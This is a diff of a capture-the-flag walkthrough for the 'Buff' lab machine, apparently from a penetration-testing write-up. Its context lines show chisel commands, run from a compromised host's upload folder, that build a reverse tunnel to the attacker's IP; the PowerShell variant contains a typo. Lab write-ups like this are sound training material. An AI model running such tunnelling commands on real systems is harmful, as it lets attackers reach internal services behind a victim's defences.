@@ -206,6 +206,7 @@ First set up the chisel server in your machine using the command below.
 Now go to vulnerable machine and type the following command inside the `C:\xampp\htdocs\gym\upload` folder.
 
 `cmd.exe command : chisel.exe client <your tun0 IP address> 8000 R:8888:127.0.0.1:8888`
+
 `powershell.exe command : .\chisel.exe client <your run0 IP address 8000 R:8888:127.0.0.1:8888>`
 
 ![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/chiselclient.png)
